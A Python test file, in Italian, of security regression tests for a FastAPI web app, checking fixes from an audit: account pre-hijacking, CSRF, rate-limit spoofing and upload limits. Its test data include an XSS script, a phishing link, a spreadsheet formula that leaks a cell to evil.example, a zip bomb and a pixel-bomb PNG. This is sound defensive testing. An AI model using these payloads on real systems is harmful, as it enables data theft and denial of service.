"""Difese aggiunte dopo l'audit di sicurezza del 4/11/2026.

Ogni test riproduce l'attacco trovato nell'audit e verifica che ora fallisca:

  - Google senza `email_verified` non entra in nessun account;
  - registrarsi con ADMIN_EMAIL non rende admin (serve la casella dimostrata);
  - pre-hijacking: chi aveva registrato l'email altrui perde password e
    sessioni quando il vero proprietario entra con Google;
  - il reset password chiude tutte le sessioni e gli altri link di reset;
  - email trattate senza distinzione fra maiuscole e minuscole;
  - blocco per account dopo troppi login falliti;
  - rate limit sull'IP vero (Cloudflare), non su X-Forwarded-For;
  - CSRF: richieste che modificano da un'origine estranea -> 403;
  - tetto alla dimensione delle richieste, header di sicurezza;
  - HTML nelle email dei lead, formule nell'export Excel, zip bomb,
    avatar con troppi pixel, snapshot di stima enormi.
"""

from __future__ import annotations

import io
import zipfile
from datetime import datetime, timedelta, timezone

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from starlette.requests import Request

import app.db as db_module
from app.config import settings
from app.db import Base
from app.limiter import limiter
from app.main import app
from app.models.user import PasswordResetToken, User, UserSession
from app.services.auth_service import AuthService
from app.services.login_guard import MAX_FALLITI
from tests.session_factory import sessione_di_test

REGISTRAZIONE_URL = "/api/v1/auth/registrati"
LOGIN_URL = "/api/v1/auth/login"
ME_URL = "/api/v1/auth/me"
RESET_URL = "/api/v1/auth/reimposta-password"
ADMIN_EMAIL = "titolare@example.com"


@pytest.fixture()
def factory(monkeypatch, tmp_path):
    limiter.reset()
    engine = create_engine(f"sqlite:///{tmp_path / 'sicurezza.db'}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(bind=engine)
    session_local = sessione_di_test(engine)

    import app.dependencies.auth as deps_auth_module
    import app.routers.auth as auth_router_module

    monkeypatch.setattr(db_module, "SessionLocal", session_local)
    monkeypatch.setattr(deps_auth_module, "SessionLocal", session_local)
    monkeypatch.setattr(auth_router_module, "SessionLocal", session_local)
    monkeypatch.setattr(settings, "ADMIN_EMAIL", ADMIN_EMAIL)
    # La regola di produzione: niente promozione senza verifica.
    monkeypatch.setattr(settings, "ADMIN_PROMUOVI_SENZA_VERIFICA", False)
    return session_local


@pytest.fixture()
def client(factory):
    return TestClient(app)


def _registra(client, email, password="Password123", nome="Utente"):
    return client.post(REGISTRAZIONE_URL, json={"email": email, "password": password, "nome": nome})


def _google(monkeypatch, userinfo: dict):
    from app.oauth import oauth

    async def finto_scambio(request):
        return {"userinfo": userinfo}

    monkeypatch.setattr(oauth.google, "authorize_access_token", finto_scambio)


# --- account e login -------------------------------------------------------------


def test_google_senza_email_verificata_rifiutato(client, factory, monkeypatch):
    _registra(client, "vittima@azienda.it")
    _google(monkeypatch, {"email": "vittima@azienda.it", "email_verified": False, "given_name": "X"})
    attaccante = TestClient(app)
    r = attaccante.get("/api/v1/auth/google/callback", follow_redirects=False)
    assert r.status_code in (302, 307)
    assert "google_auth=errore" in r.headers["location"]
    assert "session_id" not in attaccante.cookies


def test_registrazione_con_admin_email_non_rende_admin(client):
    r = _registra(client, ADMIN_EMAIL)
    assert r.status_code == 201
    assert r.json()["role"] == "user"


def test_google_verificato_promuove_admin(client, factory, monkeypatch):
    _google(monkeypatch, {"email": ADMIN_EMAIL, "email_verified": True, "given_name": "Titolare"})
    r = client.get("/api/v1/auth/google/callback", follow_redirects=False)
    assert r.status_code in (302, 307)
    assert client.get(ME_URL).json()["role"] == "admin"


def test_pre_hijacking_neutralizzato(client, factory, monkeypatch):
    """L'attaccante registra l'email della vittima con una sua password; la
    vittima entra con Google: la password dell'attaccante e la sua sessione
    non valgono piu'."""
    attaccante = TestClient(app)
    assert _registra(attaccante, "vittima@azienda.it", password="PasswordAttaccante1").status_code == 201
    assert attaccante.get(ME_URL).status_code == 200

    _google(monkeypatch, {"email": "vittima@azienda.it", "email_verified": True, "given_name": "Vittima"})
    vittima = TestClient(app)
    vittima.get("/api/v1/auth/google/callback", follow_redirects=False)
    assert vittima.get(ME_URL).status_code == 200

    assert attaccante.get(ME_URL).status_code == 401
    r = attaccante.post(LOGIN_URL, json={"email": "vittima@azienda.it", "password": "PasswordAttaccante1"})
    assert r.status_code == 401


def test_google_su_account_gia_verificato_non_tocca_la_password(client, factory, monkeypatch):
    with factory() as s:
        s.add(User(email="a@b.it", nome="A", role="user", email_verificata=True,
                   password_hash=AuthService.hash_password("Password123")))
        s.commit()
    _google(monkeypatch, {"email": "a@b.it", "email_verified": True})
    TestClient(app).get("/api/v1/auth/google/callback", follow_redirects=False)
    assert client.post(LOGIN_URL, json={"email": "a@b.it", "password": "Password123"}).status_code == 200


def test_reset_chiude_sessioni_e_altri_link_e_verifica_email(client, factory):
    from app.routers.auth import _hash_reset_token
    from app.services.reset_token import make_reset_token

    _registra(client, ADMIN_EMAIL)
    with factory() as s:
        user = s.query(User).filter_by(email=ADMIN_EMAIL).one()
        uid = user.id
        scadenza = datetime.now(timezone.utc) + timedelta(hours=1)
        token_a, token_b = make_reset_token(uid), make_reset_token(uid) + "x"
        s.add(PasswordResetToken(user_id=uid, token_hash=_hash_reset_token(token_a), expires_at=scadenza))
        s.add(PasswordResetToken(user_id=uid, token_hash=_hash_reset_token(token_b), expires_at=scadenza))
        s.commit()
    assert client.get(ME_URL).status_code == 200

    r = client.post(RESET_URL, json={"token": token_a, "password": "NuovaPassword1"})
    assert r.status_code == 200
    assert client.get(ME_URL).status_code == 401  # la sessione aperta e' chiusa
    with factory() as s:
        assert s.query(UserSession).filter_by(user_id=uid).count() == 0
        assert s.query(PasswordResetToken).filter_by(user_id=uid, used=False).count() == 0
        user = s.get(User, uid)
        assert user.email_verificata is True
        assert user.role == "admin"  # casella dimostrata: ora la promozione vale


def test_email_senza_distinzione_maiuscole(client):
    assert _registra(client, "Mario.Rossi@Example.COM").status_code == 201
    assert _registra(client, "mario.rossi@example.com").status_code == 409
    r = TestClient(app).post(LOGIN_URL, json={"email": "MARIO.ROSSI@example.com", "password": "Password123"})
    assert r.status_code == 200
    assert r.json()["email"] == "mario.rossi@example.com"


def test_blocco_per_account_dopo_troppi_errori(client, monkeypatch):
    _registra(client, "bersaglio@example.com")
    # Ogni tentativo da un "IP" diverso: il limite per IP non scatta mai.
    for i in range(MAX_FALLITI):
        r = client.post(
            LOGIN_URL,
            json={"email": "bersaglio@example.com", "password": f"sbagliata{i}"},
            headers={"CF-Connecting-IP": f"10.0.0.{i}"},
        )
        assert r.status_code == 401
    r = client.post(
        LOGIN_URL,
        json={"email": "bersaglio@example.com", "password": "Password123"},
        headers={"CF-Connecting-IP": "10.0.1.1"},
    )
    assert r.status_code == 429


def test_password_lunghissima_rifiutata(client):
    assert _registra(client, "x@example.com", password="a" * 10_000).status_code == 422


# --- IP reale e rate limit ---------------------------------------------------------


def _richiesta(headers: dict[str, str], host="1.2.3.4") -> Request:
    scope = {
        "type": "http",
        "headers": [(k.lower().encode(), v.encode()) for k, v in headers.items()],
        "client": (host, 1234),
    }
    return Request(scope)


def test_client_ip_ignora_x_forwarded_for():
    from app.security import client_ip

    assert client_ip(_richiesta({"X-Forwarded-For": "6.6.6.6"}, host="1.2.3.4")) == "1.2.3.4"
    assert client_ip(_richiesta({"X-Forwarded-For": "6.6.6.6", "CF-Connecting-IP": "8.8.8.8"})) == "8.8.8.8"
    assert client_ip(_richiesta({"True-Client-IP": "9.9.9.9"})) == "9.9.9.9"


def test_x_forwarded_for_casuale_non_aggira_il_rate_limit(client):
    stati = [
        client.post(
            LOGIN_URL,
            json={"email": f"nessuno{i}@example.com", "password": "x"},
            headers={"X-Forwarded-For": f"203.0.113.{i}"},
        ).status_code
        for i in range(8)
    ]
    assert 429 in stati


# --- CSRF, dimensione, header --------------------------------------------------------


def test_csrf_origine_estranea_rifiutata(client):
    r = client.post(LOGIN_URL, json={"email": "a@b.it", "password": "x"}, headers={"Origin": "https://evil.example"})
    assert r.status_code == 403


def test_csrf_sec_fetch_site_cross_site_rifiutato(client):
    r = client.post(LOGIN_URL, json={"email": "a@b.it", "password": "x"}, headers={"Sec-Fetch-Site": "cross-site"})
    assert r.status_code == 403


def test_csrf_origine_ammessa_passa(client, monkeypatch):
    monkeypatch.setattr(settings, "CORS_ORIGINS", "https://renovio.example")
    r = client.post(
        LOGIN_URL, json={"email": "a@b.it", "password": "x"}, headers={"Origin": "https://renovio.example"}
    )
    assert r.status_code == 401  # arriva al login: credenziali sbagliate, non CSRF


def test_csrf_get_non_controllata(client):
    assert client.get(ME_URL, headers={"Origin": "https://evil.example"}).status_code == 401


def test_webhook_stripe_esente_da_csrf(client):
    r = client.post("/api/v1/stripe/webhook", content=b"{}", headers={"Origin": "https://evil.example"})
    assert r.status_code != 403


def test_body_troppo_grande(client):
    r = client.post(
        REGISTRAZIONE_URL,
        content=b"x",
        headers={"Content-Length": str(50 * 1024 * 1024), "Content-Type": "application/json"},
    )
    assert r.status_code == 413


def test_header_di_sicurezza(client):
    h = client.get(ME_URL).headers
    assert h["x-content-type-options"] == "nosniff"
    assert h["x-frame-options"] == "DENY"
    assert h["referrer-policy"] == "no-referrer"


# --- lead, export, import, avatar, stime salvate --------------------------------------


def test_lead_html_escapato():
    from app.routers.lead import _contatto_html, _riepilogo_html
    from app.schemas.lead import LeadCreate

    payload = LeadCreate.model_validate(
        {
            "nome": '<a href="https://phish.example">Paga qui</a>',
            "email": "a@b.it",
            "preferenza_contatto": "email",
            "messaggio": "<script>alert(1)</script>",
            "citta": "<b>Reggio</b>",
            "mq": 85,
            "tipo": "totale",
            "totale_min": 1000,
            "totale_max": 2000,
        }
    )
    html = _contatto_html(payload) + _riepilogo_html(payload)
    assert "<a href" not in html and "<script>" not in html and "<b>" not in html
    assert "&lt;a href=&quot;https://phish.example&quot;&gt;" in html


def test_export_excel_mai_formule():
    from openpyxl import Workbook, load_workbook

    from app.services.export_excel.workbook import scrivi_foglio_dati, serializza

    wb = Workbook()
    payload = '=HYPERLINK("https://evil.example/?"&B2,"Apri")'
    scrivi_foglio_dati(wb, nome="lead", colonne=["id", "nome"], righe=[{"id": 1, "nome": payload}])
    riletto = load_workbook(io.BytesIO(serializza(wb)))["lead"]
    cella = riletto["B2"]
    assert cella.data_type == "s"
    assert cella.value == payload


def test_import_zip_bomb_rifiutato():
    from app.services.listino_upload_service import (
        MAX_XLSX_ESPANSO_BYTES,
        UploadValidationError,
        validate_upload,
    )

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("xl/worksheets/sheet1.xml", b"0" * (MAX_XLSX_ESPANSO_BYTES + 1))
    contenuto = buffer.getvalue()
    assert len(contenuto) < 1024 * 1024  # piccolo compresso, enorme espanso
    with pytest.raises(UploadValidationError):
        validate_upload("bomba.xlsx", len(contenuto), contenuto)


def test_avatar_troppi_pixel_rifiutato():
    from PIL import Image

    from app.services.avatar_service import MAX_PIXELS, AvatarValidationError, process_avatar

    # PNG palettizzato quasi vuoto: pochi KB su disco, oltre MAX_PIXELS dichiarati.
    lato = int(MAX_PIXELS**0.5) + 100
    buffer = io.BytesIO()
    Image.new("1", (lato, lato)).save(buffer, format="PNG", optimize=True)
    with pytest.raises(AvatarValidationError):
        process_avatar(buffer.getvalue())


def test_stima_salvata_troppo_grande_rifiutata():
    from pydantic import ValidationError

    from app.schemas.stima_salvata import StimaSalvataCreate

    categoria = {"code": "A", "nome": "x", "iva_pct": "0.10", "totale_min": 1, "totale_max": 2}
    with pytest.raises(ValidationError):
        StimaSalvataCreate.model_validate(
            {
                "input": {"citta": "Reggio Emilia", "mq": 85, "tipo": "totale"},
                "fallback": False,
                "valuta": "EUR",
                "categorie": [categoria] * 500,
                "extra": [],
                "totale": {"totale_min": 1, "totale_max": 2},
            }
        )
